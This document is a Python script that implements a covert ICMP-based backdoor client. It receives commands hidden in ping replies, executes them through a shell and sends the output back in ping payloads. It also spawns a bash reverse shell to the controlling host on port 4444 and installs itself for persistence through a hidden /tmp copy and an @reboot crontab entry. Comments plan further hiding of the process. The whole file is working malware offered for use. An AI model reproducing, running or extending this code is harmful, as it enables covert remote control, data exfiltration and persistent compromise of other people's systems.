import socket
import struct
import time
import random
import os
import subprocess
import sys

SERVER_IP = "192.168.108.137"  # IP addr of whatever the server script is running on, this one is from local testing
INTERVAL = 5  # Ping interval
CLIENT_ID = random.randint(1000, 9999)  # Unique ID per session
PERSISTENT_PATH = "/tmp/.hidden_icmp_client" # TODO: change this so its masked, then use this for persistence

def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    checksum = 0
    for i in range(0, len(data), 2):
        part = (data[i] << 8) + data[i+1]
        checksum += part
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    return ~checksum & 0xFFFF

def create_icmp_packet(seq, payload):
    icmp_type = 8  # Echo Request
    icmp_code = 0
    identifier = CLIENT_ID
    checksum_placeholder = 0
    header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum_placeholder, identifier, seq)
    data = payload.encode("utf-8")
    full_packet = header + data
    chksum = checksum(full_packet)
    header = struct.pack("!BBHHH", icmp_type, icmp_code, chksum, identifier, seq)
    return header + data

def send_ping(sock, seq, message):
    packet = create_icmp_packet(seq, message)
    sock.sendto(packet, (SERVER_IP, 1))

def receive_reply(sock):
    """Wait for ICMP reply and extract message."""
    try:
        data, addr = sock.recvfrom(2048)
        if addr[0] == SERVER_IP:
            icmp_header = data[20:28]
            _type, _code, _checksum, _id, seq = struct.unpack("!BBHHH", icmp_header)
            if _type == 0:  # Echo Reply
                return data[28:].decode("utf-8", errors="ignore").strip()
    except socket.timeout:
        return None
    return None

def reverse_shell():
    """Spawns a reverse shell as a separate process."""
    subprocess.Popen(
        ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{SERVER_IP}/4444 0>&1"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
    )

def execute_command(command):
    """Executes command safely, stripping unwanted text."""
    try:
        if command.startswith("CMD:"):
            command = command[4:]  # Strip "CMD:" prefix
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, error = process.communicate()
        return (output + error).strip()
    except Exception as e:
        return f"Error: {str(e)}"

def send_command_output(sock, seq, output):
    """Send command output in chunks."""
    chunk_size = 128
    if not output:
        output = "[No output]"
    chunks = [output[i:i+chunk_size] for i in range(0, len(output), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        # Add chunk indicator
        chunk_msg = f"[{i+1}/{len(chunks)}] {chunk}"
        send_ping(sock, seq + i, chunk_msg)
        time.sleep(0.5)  # Small delay between chunks

def setup_persistence():
    """Ensure persistence via crontab."""
    if not os.path.exists(PERSISTENT_PATH):
        os.system(f"cp {sys.argv[0]} {PERSISTENT_PATH}")
        os.system(f"chmod +x {PERSISTENT_PATH}")

    # TODO: add more layers of persistence, try and hide process/script?
    cron_job = f"@reboot {PERSISTENT_PATH} &"
    cron_file = "/tmp/cronjob"
    os.system(f"crontab -l 2>/dev/null | grep -v '{PERSISTENT_PATH}' > {cron_file}")
    with open(cron_file, "a") as f:
        f.write(cron_job + "\n")
    os.system(f"crontab {cron_file} && rm {cron_file}")

def main():
    setup_persistence()
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.settimeout(3)
    seq = 1

    while True:
        send_ping(sock, seq, f"ALIVE:{CLIENT_ID}")  # Heartbeat with client ID
        print(f"[+] Sent heartbeat (seq {seq}, ID {CLIENT_ID})")

        response = receive_reply(sock)
        if response:
            print(f"[+] Command received: {response}")

            if response.lower() == "exit":
                print("[!] Exiting...")
                break
            elif response.lower() == "shell":
                print("[!] Spawning reverse shell...")
                reverse_shell()
                send_ping(sock, seq + 1, "Shell spawned")
            elif response.startswith("CMD:"):
                print(f"[!] Executing command: {response[4:]}")
                output = execute_command(response)
                send_command_output(sock, seq + 1, output)
        
        seq += 1
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()
